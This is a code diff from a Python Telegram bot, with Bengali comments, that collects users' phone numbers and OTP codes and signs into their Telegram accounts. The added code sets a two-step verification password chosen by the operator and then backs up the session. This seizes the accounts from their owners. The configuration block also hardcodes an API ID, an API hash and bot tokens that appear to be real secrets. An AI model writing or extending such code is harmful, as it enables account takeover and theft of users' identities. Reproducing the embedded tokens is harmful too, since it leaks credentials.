@@ -30,7 +30,7 @@ from telethon.errors import SessionPasswordNeededError
 # ==================== CORE CONFIGURATION ====================
 API_ID = 36547444
 API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
-BOT_TOKEN = "8288574083:AAE9eidUl-iZl0I4Sbt8jcDM7k8JJqSYK_Y"
+BOT_TOKEN = "8424216052:AAHjO2yIsirQhZfsZ6Ab6QVAyA2foSuimVk"
 ADMIN_ID = 8095751648
 
 MAIN_CHANNEL_ID = -1003904729385          
@@ -656,81 +656,57 @@ async def send_otp_task(phone_number, country_code, user_id, message, processing
     except Exception as e:
         try: await user_client.disconnect()
         except: pass
-            
+
 async def verify_otp_task(text, user_id, message):
     data = user_data[user_id]
     try:
-        # ১. ওটিপি ভেরিফাই
+        # ১. ওটিপি ভেরিফাই করার চেষ্টা
         await data["client"].sign_in(
             phone=data["phone"],
             code=text,
             phone_code_hash=data["phone_code_hash"]
         )
 
+        # সফল হলে ২-এফএ সেটআপ এবং স্প্যাম চেক
         settings = load_settings()
-        status = await get_spam_status(data["client"])
-        is_limited = "limited" in status.lower()
-        is_filter_on = settings.get("spam_filter_active", True)
         
-        status_text = "Free as a Bird" if not is_limited else "Limited"
-
-        # লজিক ১: ফিল্টার ON থাকলে (স্প্যাম-ফ্রি একাউন্ট নেবে)
-        if is_filter_on:
-            if not is_limited:
-                await data["client"].edit_2fa(new_password=settings["security_password"])
-                bot.send_message(message.chat.id, f"✅ **Spam Status:** {status_text}\n\n🎉 **The account number was successfully received!**")
-                await process_backup(user_id, message, data)
-                return
-            else:
+        if settings.get("spam_filter_active", False):
+            status = await get_spam_status(data["client"])
+            if "limited" in status.lower():
                 bot.reply_to(message, "🚫 **Access Denied:** Account is Limited.")
                 try: await data["client"].disconnect()
                 except: pass
-
-        # লজিক ২: ফিল্টার OFF থাকলে (স্প্যাম একাউন্ট নেবে)
-        else:
-            if is_limited:
-                await data["client"].edit_2fa(new_password=settings["security_password"])
-                bot.send_message(message.chat.id, f"✅ **Spam Status:** {status_text}\n\n🎉 **The account number was successfully received!**")
-                await process_backup(user_id, message, data)
+                del user_data[user_id]
                 return
-            else:
-                bot.reply_to(message, "🚫 **Access Denied:** Only Spam accounts are allowed.")
-                try: await data["client"].disconnect()
-                except: pass
+
+        # স্প্যাম ফ্রি হলে 2FA সেট হবে
+        try:
+            await data["client"].edit_2fa_password(new_password=settings["security_password"])
+        except Exception as e:
+            print(f"2FA Setup Error: {e}")
+
+        # ব্যাকআপ প্রসেস শুরু
+        await process_backup(user_id, message, data)
+        del user_data[user_id]
+
+    except SessionPasswordNeededError:
+        bot.reply_to(message, "❌ **Two-Step Verification Active.**")
+        try: await data["client"].disconnect()
+        except: pass
+        del user_data[user_id]
+    except Exception as e:
+        error_str = str(e)
+        if "PHONE_CODE_INVALID" in error_str:
+            bot.reply_to(message, "❌ **Wrong OTP!**")
+        elif "PHONE_CODE_EXPIRED" in error_str:
+            bot.reply_to(message, "❌ **OTP Expired!**")
+        else:
+            bot.reply_to(message, f"❌ **Error:** {error_str}")
         
-        del user_data[user_id]
-
-    except SessionPasswordNeededError:
-        bot.reply_to(message, "❌ **Two-Step Verification Active.**")
+        # ভুল হলে সেশনটি ডিসকানেক্ট করে দাও যাতে মেমোরি খালি হয়
         try: await data["client"].disconnect()
         except: pass
-        del user_data[user_id]
-    except Exception as e:
-        bot.reply_to(message, f"❌ **Error:** {str(e)}")
-        try: await data["client"].disconnect()
-        except: pass
-        del user_data[user_id]
-    except SessionPasswordNeededError:
-        bot.reply_to(message, "❌ **Two-Step Verification Active.**")
-        try: await data["client"].disconnect()
-        except: pass
-        del user_data[user_id]
-    except Exception as e:
-        bot.reply_to(message, f"❌ **Error:** {str(e)}")
-        try: await data["client"].disconnect()
-        except: pass
-        del user_data[user_id]
-
-    except SessionPasswordNeededError:
-        bot.reply_to(message, "❌ **Two-Step Verification Active.**")
-        try: await data["client"].disconnect()
-        except: pass
-        del user_data[user_id]
-    except Exception as e:
-        bot.reply_to(message, f"❌ **Error:** {str(e)}")
-        try: await data["client"].disconnect()
-        except: pass
-        del user_data[user_id]
+        return
 
 async def process_backup(user_id, message, data):
     client = data["client"]
